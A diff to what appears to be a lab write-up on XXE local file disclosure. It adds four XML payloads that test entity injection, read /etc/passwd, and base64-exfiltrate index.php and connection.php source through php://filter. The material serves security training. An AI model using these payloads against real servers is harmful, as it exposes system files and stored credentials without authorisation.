@@ -271,11 +271,59 @@ Try to read the content of the `connection.php` file, and submit the value of th
 
 ![Burp Suite - POST Submit Details](./assets/screenshots/web_attacks_local_file_disclosure_burpsuite_post_submit_details.png)
 
+```xml
+<!DOCTYPE email [
+<!ENTITY payload "XXE TEST">
+]>
+
+[SNIP]
+
+<email>
+	&payload;
+</email>
+```
+
 ![Burp Suite - POST XXE Attempt 1](./assets/screenshots/web_attacks_local_file_disclosure_burpsuite_post_xxe_attempt_1.png)
+
+```xml
+<!DOCTYPE email [
+<!ENTITY payload SYSTEM "file:///etc/passwd">
+]>
+
+[SNIP]
+
+<email>
+	&payload;
+</email>
+```
 
 ![Burp Suite - POST XXE Attempt 2](./assets/screenshots/web_attacks_local_file_disclosure_burpsuite_post_xxe_attempt_2.png)
 
+```xml
+<!DOCTYPE email [
+<!ENTITY payload SYSTEM "php://filter/convert.base64-encode/resource=index.php">
+]>
+
+[SNIP]
+
+<email>
+	&payload;
+</email>
+```
+
 ![Burp Suite - POST XXE Attempt 3](./assets/screenshots/web_attacks_local_file_disclosure_burpsuite_post_xxe_attempt_3.png)
+
+```xml
+<!DOCTYPE email [
+<!ENTITY payload SYSTEM "php://filter/convert.base64-encode/resource=connection.php">
+]>
+
+[SNIP]
+
+<email>
+	&payload;
+</email>
+```
 
 ![Burp Suite - POST XXE Attempt 4](./assets/screenshots/web_attacks_local_file_disclosure_burpsuite_post_xxe_attempt_4.png)
 
